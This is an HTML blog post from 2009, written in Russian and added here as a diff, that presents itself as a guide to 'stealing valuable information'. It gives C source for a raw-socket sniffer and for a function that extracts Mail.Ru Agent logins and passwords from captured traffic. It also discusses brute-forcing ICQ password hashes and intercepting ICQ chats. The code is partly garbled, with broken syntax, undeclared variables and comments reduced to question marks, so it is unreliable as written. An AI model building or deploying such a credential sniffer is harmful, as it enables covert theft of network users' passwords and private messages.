@@ -1,0 +1,187 @@
+<!DOCTYPE html><html lang="ru"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1,maximum-scale=1"><meta name="robots" content="index,noarchive,follow,max-image-preview:large"><meta name="referrer" content="unsafe-url"><link rel="stylesheet" href="/stylesheets/style.d0b9e4490a.css"><link rel="icon" href="/images/favicon.ico"><link rel="apple-touch-icon" href="/images/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><script src="/javascripts/counter.js" async></script><title>Фильтры трафика или как украсть ценную информацию | by Igor Riakhovskii</title><meta name="title" content="Фильтры трафика или как украсть ценную информацию | by Igor Riakhovskii"><meta name="description" content="Сейчас практически везде есть интернет, а это значит, что существуют сервера, которые его раздают. Крупные офисные сети, локальные сети, провайдеры..."><meta property="og:title" content="Фильтры трафика или как украсть ценную информацию"><meta property="og:description" content="Сейчас практически везде есть интернет, а это значит, что существуют сервера, которые его раздают. Крупные офисные сети, локальные сети, провайдеры..."><meta property="og:url" content="https://gariktalksabout.tech/filtry-trafika-ili-kak-ukrast-cennuyu-informaciyu.html"><meta property="og:site_name" content="Igor Riakhovskii"><meta property="og:type" content="article"><meta property="article:published_time" content="2009-07-19T22:23:00+04:00"><meta property="article:modified_time" content="2025-01-30T23:16:16+03:00"><meta property="profile:first_name" content="Igor"><meta property="profile:last_name" content="Riakhovskii"><meta property="profile:username" content="garikdjan"><meta property="article:tag" content="Research"><link rel="author" href="https://gariktalksabout.tech/"><link rel="canonical" href="https://gariktalksabout.tech/filtry-trafika-ili-kak-ukrast-cennuyu-informaciyu.html"><script type="application/ld+json">{"@context":"http://schema.org","@type":"NewsArticle","url":"https://gariktalksabout.tech/filtry-trafika-ili-kak-ukrast-cennuyu-informaciyu.html","dateCreated":"2009-07-19T22:23:00+04:00","datePublished":"2009-07-19T22:23:00+04:00","dateModified":"2025-01-30T23:16:16+03:00","headline":"Фильтры трафика или как украсть ценную информацию","name":"Фильтры трафика или как украсть ценную информацию","description":"Сейчас практически везде есть интернет, а это значит, что существуют сервера, которые его раздают. Крупные офисные сети, локальные сети, провайдеры...","identifier":74752816,"author":{"@type":"Person","name":"Igor Riakhovskii","url":"https://gariktalksabout.tech/"},"creator":["Igor Riakhovskii"],"mainEntityOfPage":"https://gariktalksabout.tech/filtry-trafika-ili-kak-ukrast-cennuyu-informaciyu.html"}</script><script src="/javascripts/header.js" defer></script></head><body><header class="header-panel"><div class="header-panel-wrap"><a class="header-panel-logo" href="/" rel="noopener follow">IR</a></div></header><main class="article-layout"><div class="container"><article><h1 class="post-title">Фильтры трафика или как украсть ценную информацию</h1><section class="post-info"><a class="author-photo-link" rel="noopener follow" href="/"><img class="author-photo" alt="Igor Riakhovskii" src="/v1/resize:fill:88:88/public/avatar.jpg" width="44" height="44" loading="lazy"><div class="author-photo-shadow"></div></a><div class="post-info-author"><a class="author-name" rel="noopener follow" href="/">Igor Riakhovskii</a><div class="post-info-date"><span>5 min read</span><span class="separator">·</span><span>Jul 19, 2009</span></div></div></section><div class="post-content"><p>Сейчас практически везде есть интернет, а это значит, что существуют сервера, которые его раздают. Крупные офисные сети, локальные сети, провайдеры ммм как много вкусной информации ;)</p>
+<p>Анализаторов трафика или снифферов сейчас предостаточно, лично я пользуюсь <a href="http://www.wireshark.org/" rel="noopener ugc nofollow" target="_blank">wireshark</a>, но мы же круты и напишем простейший сниффер на Си.</p>
+<p>Для того чтобы получать данные с сетевой карты ее нужно перевести в режим "<a href="http://ru.wikipedia.org/wiki/Promiscuous_mode" rel="noopener ugc nofollow" target="_blank">promiscuous_mode</a>"</p>
+<pre><code class="hljs language-c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])</span> {
+  WSADATA wsadata;
+  SOCKET sock;
+  CHAR szHostName[<span class="hljs-number">16</span>];
+  HOSTENT* phe;
+  SOCKADDR_IN sa;
+  DWORD flag = TRUE;
+
+  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> buffer[<span class="hljs-number">65555</span>];
+
+  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">in_addr</span> <span class="hljs-title">need</span>;</span>  <span class="hljs-comment">// А это необходимо для inet_ntoa макроса</span>
+
+  WSAStartup(MAKEWORD(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>), &#x26;wsadata);
+
+  sock = socket(AF_INET, SOCK_RAW, IPPROTO_IP);
+
+  <span class="hljs-keyword">if</span> (sock == INVALID_SOCKET) {
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Error create socket\n"</span>);
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+  }
+
+  <span class="hljs-keyword">if</span> (gethostname(szHostName, <span class="hljs-keyword">sizeof</span> szHostName) != <span class="hljs-number">0</span>) {
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Error get hostname\n"</span>);
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+  }
+
+  phe = gethostbyname(szHostName);
+  <span class="hljs-keyword">if</span> (phe == <span class="hljs-literal">NULL</span>) {
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Error get hostname data\n"</span>);
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+  }
+
+  ZeroMemory(&#x26;sa, <span class="hljs-keyword">sizeof</span> sa);
+  sa.sin_family = AF_INET;
+  sa.sin_addr.s_addr = ((<span class="hljs-keyword">struct</span> in_addr*)phe - > h_addr_list[<span class="hljs-number">0</span>]) - > s_addr;
+
+  need.s_addr = sa.sin_addr.s_addr;
+
+  <span class="hljs-keyword">if</span> (bind(sock, &#x26;sa, <span class="hljs-keyword">sizeof</span>(sa)) != <span class="hljs-number">0</span>) {
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Error set bind socket\n"</span>);
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+  }
+
+  <span class="hljs-keyword">if</span> (ioctlsocket(sock, SIO_RCVALL, &#x26;flag) == SOCKET_ERROR) {
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Error activate promiscuous mode\n"</span>);
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+  }
+
+  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)
+
+  {
+    resbuf = recvfrom(sock, buffer, <span class="hljs-keyword">sizeof</span> buffer, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
+
+    <span class="hljs-comment">// ставим фильтр тока на исходящий траффик</span>
+    <span class="hljs-comment">// можешь убрать или настроить только на входящий</span>
+    ip = (<span class="hljs-keyword">struct</span> my_ip*)(buffer);
+    <span class="hljs-keyword">if</span> (need.s_addr != ip - > ip_source) {
+      <span class="hljs-keyword">continue</span>;
+    }
+
+    <span class="hljs-comment">// анализ принятого буффера</span>
+  }
+
+  closesocket(sock);
+  WSACleanup;
+
+  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</code></pre>
+<p>Ну, теперь трафика у нас предостаточно, что же мы будем с ним делать? Анализировать товарищи! но не руками, а функциями</p>
+<p>Давайте для начала напишем функцию, которая будет показывать логины и пароли при подключении Mail Agent-а.</p>
+<p>Изучив <a href="http://agent.mail.ru/ru/developers/protocol.html" rel="noopener ugc nofollow" target="_blank">документацию по протоколу MRA</a> становится ясно, что для подключения клиент должен послать пакет MRIM_CS_LOGIN2</p>
+<blockquote>
+<p>Имя пакета: MRIM_CS_LOGIN2<br>
+Тип пакета: cs<br>
+Параметры:</p>
+<p>LPS ## login ## email авторизующегося пользователя<br>
+LPS ## password ## пароль<br>
+UL ## status ## статус (см. MRIM_CS_CHANGE_STATUS)<br>
+LPS ## user_agent ## текстовое описание клиента пользователя, например "Mail.Ru Miranda Plugin v 1.0"</p>
+</blockquote>
+<p>нам остается лишь включить сниффер, найти этот пакет скопировать его дамп в файлик и написать функцию его разбора</p>
+<pre><code class="hljs language-c"><span class="hljs-type">int</span> *<span class="hljs-title function_">mraTest</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *buffer, <span class="hljs-type">size_t</span> buflen)</span> {
+  <span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mrim_packet_header_t</span> {</span>
+    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> magic;         <span class="hljs-comment">// Magic</span>
+    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> proto;         <span class="hljs-comment">// ?????? ?????????</span>
+    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> seq;           <span class="hljs-comment">// Sequence</span>
+    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> msg;           <span class="hljs-comment">// ??? ??????</span>
+    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> dlen;          <span class="hljs-comment">// ????? ??????</span>
+    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> from;          <span class="hljs-comment">// ????? ???????????</span>
+    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> fromport;      <span class="hljs-comment">// ???? ???????????</span>
+    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> reserved[<span class="hljs-number">16</span>];  <span class="hljs-comment">// ???????????????</span>
+  } <span class="hljs-type">mrim_packet_header_t</span>;
+
+  <span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">lps</span> {</span>
+    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> dlen;
+    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> str[<span class="hljs-number">255</span>];
+  } lps;
+
+  <span class="hljs-type">mrim_packet_header_t</span> cs;
+  lps datas;
+  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *p, *d;
+  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> magic[] = {<span class="hljs-number">0xEF</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0xDE</span>};
+  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> login_msg[] = {<span class="hljs-number">0x38</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>};
+  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *pack;
+
+  <span class="hljs-type">int</span> i;
+
+  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> maxaddr;
+  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> packaddr;
+
+  FILE *f;
+
+  p = memmem(buffer, &#x26;magic, buflen, <span class="hljs-number">4</span>);
+
+  <span class="hljs-keyword">if</span> (p != <span class="hljs-number">0</span>) {
+    d = memmem(buffer, &#x26;login_msg, buflen, <span class="hljs-number">4</span>);
+    <span class="hljs-keyword">if</span> (d != <span class="hljs-number">0</span>) {
+      <span class="hljs-built_in">memset</span>(&#x26;cs, <span class="hljs-number">0x00</span>, <span class="hljs-keyword">sizeof</span>(cs));
+      <span class="hljs-built_in">memcpy</span>(&#x26;cs, p, <span class="hljs-number">44</span>);
+
+      <span class="hljs-keyword">if</span> (cs.msg = <span class="hljs-number">0x1038</span>) {
+        <span class="hljs-comment">// printf("%d %d\n",buflen,cs.dlen);</span>
+
+        <span class="hljs-comment">// буффер без заголовка</span>
+        <span class="hljs-keyword">if</span> ((buflen - <span class="hljs-keyword">sizeof</span>(cs)) &#x3C;= <span class="hljs-number">80</span>) {
+          <span class="hljs-keyword">return</span> (<span class="hljs-type">int</span> *)cs.dlen;
+        }
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Mail Agent login------------\n"</span>);
+        pack = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(cs.dlen);
+        <span class="hljs-built_in">memcpy</span>(pack, p + <span class="hljs-keyword">sizeof</span>(cs), cs.dlen);
+        <span class="hljs-built_in">memcpy</span>(&#x26;datas, &#x26;pack[<span class="hljs-number">0</span>], <span class="hljs-keyword">sizeof</span>(datas));
+        <span class="hljs-keyword">if</span> (datas.dlen > <span class="hljs-number">255</span>) {
+          <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+        }
+        datas.str[datas.dlen] = <span class="hljs-string">'\000'</span>;
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Login: %s\n"</span>, datas.str);
+
+        <span class="hljs-built_in">memcpy</span>(&#x26;datas, &#x26;pack[datas.dlen + <span class="hljs-number">4</span>], <span class="hljs-keyword">sizeof</span>(datas));
+        <span class="hljs-keyword">if</span> (datas.dlen > <span class="hljs-number">255</span>) {
+          <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+        }
+        datas.str[datas.dlen] = <span class="hljs-string">'\000'</span>;
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Password: %s\n"</span>, datas.str);
+
+        <span class="hljs-built_in">free</span>(pack);
+        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
+      }
+    }
+  }
+
+  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</code></pre>
+<p>функцию я писал давно и она, к сожалению, не блещет интеллектом, но работает ) (З.Ы.: напиши лучше!)<br>
+теперь чтобы наша функция работала в паре с нашим снифером допишем ее сюда</p>
+<pre><code class="hljs language-c"><span class="hljs-comment">// анализ принятого буфера  </span>
+mraTest(buffer,resbuf);
+</code></pre>
+<p>Ну, маил агент это как-то не интересно, давайте замахнемся на ICQ!<br>
+но тут не все так просто лично я не знаю на данный момент программы, которая использует не шифрованную версию авторизации (кстати, в QIPе была галочка о простом доступе), а подобрать MD5 хеш пароля очень сложно ведь он по старым стандартам генерировался так</p>
+<pre><code class="hljs language-c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> AIM_MD5_STRING <span class="hljs-string">"AOL Instant Messenger (SM)"</span>  </span>
+  
+<span class="hljs-comment">/* calculate md5-hash to send to server */</span>  
+md5_init(&#x26;state);  
+md5_append(&#x26;state, (<span class="hljs-type">const</span> <span class="hljs-type">md5_byte_t</span> *)authkey, <span class="hljs-built_in">strlen</span>(authkey));  
+md5_append(&#x26;state, (<span class="hljs-type">const</span> <span class="hljs-type">md5_byte_t</span> *)passwd, <span class="hljs-built_in">strlen</span>(passwd));  
+md5_append(&#x26;state, (<span class="hljs-type">const</span> <span class="hljs-type">md5_byte_t</span> *)AIM_MD5_STRING, <span class="hljs-built_in">strlen</span>(AIM_MD5_STRING));  
+md5_finish(&#x26;state, (<span class="hljs-type">md5_byte_t</span> *)auth_hash);  
+  
+<span class="hljs-comment">/* Now we ready send to server auth_hash array (16 bytes long) */</span>
+</code></pre>
+<p>впринципе изучив новый протокол мы можем спокойно вытащить и authkey (там не существенные изменения), а открыв программу в отладчике попытаться найти строку AIM_MD5_STRING, а патом долго брутить пароль хех</p>
+<p>Нет, мы реализуем кое-что поинтереснее, мы будем перехватывать переписку!</p>
+<p>Открыв сниффер включив миранду и отправив другу, сообщение я выяснил, что она отправляет сообщения <a href="http://iserverd.khstu.ru/oscar/snac_04_06.html" rel="noopener ugc nofollow" target="_blank">вот таким</a> макаром, а если быть еще точнее <a href="http://iserverd.khstu.ru/oscar/snac_04_06_ch2.html" rel="noopener ugc nofollow" target="_blank">то таким</a>. За дело! сохраняем дамп пакета и начинаем кодить...</p>
+<p>вот такой код вышел у меня, и он обрабатывает лишь исходящие сообщения (код потерян в анналах истории).</p>
+<p>теперь прикрепляем его в наш сниффер</p>
+<pre><code class="hljs language-c"><span class="hljs-comment">// анализ принятого буффера</span>
+mraTest(buffer,resbuf);
+ICQtestMessage(buffer,resbuf);
+</code></pre>
+<p>Я надеюсь, вы втянетесь в разработку фильтров ведь в ICQ я описал лишь прием, да и то только по второму каналу и 1 типу сообщения )</p>
+<p>Если задумываться о развитии этого проекта, то можно скрестить его с базами данных и вести нехилое хистори пользователей сети хех ну или искать в сообщениях слова алах-агбар и палить IP пользователя компетентным органам</p>
+<p>З.Ы: по закону у каждого провайдера должен стоят сервер ФСБ, а что он там делает 8). В моем универе не хилая сеть, а администраторы мои друзья. Не дай бог там проверить почту зайти в аську или контакт 8)</p></div></article><div class="post-tags"><div class="topics-list"><div class="topic-item"><a class="topic-item-link" rel="noopener follow" href="/tag/research.html"><div class="topic-item-text">Research</div></a></div></div></div></div></main><footer class="article-footer"><div class="container"><div class="content"><div class="space"></div><section class="author-section"><a class="author-section-left" rel="noopener follow" href="/"><div class="avatar-box"><img class="avatar mobile-hide" alt="Igor Riakhovskii" src="/v1/resize:fill:96:96/public/avatar.jpg" width="48" height="48" loading="lazy"><div class="avatar-shadow mobile-hide"></div><img class="avatar-big mobile-only" alt="Igor Riakhovskii" src="/v1/resize:fill:128:128/public/avatar.jpg" width="64" height="64" loading="lazy"><div class="avatar-big-shadow mobile-only"></div></div></a><div><a class="author-name" rel="noopener follow" href="/">Written by Igor Riakhovskii</a><div class="author-summary">In commercial development since 2005. At the moment, I am engaged in product development of cloud systems in the role of Technical Lead</div></div></section></div></div></footer></body></html>
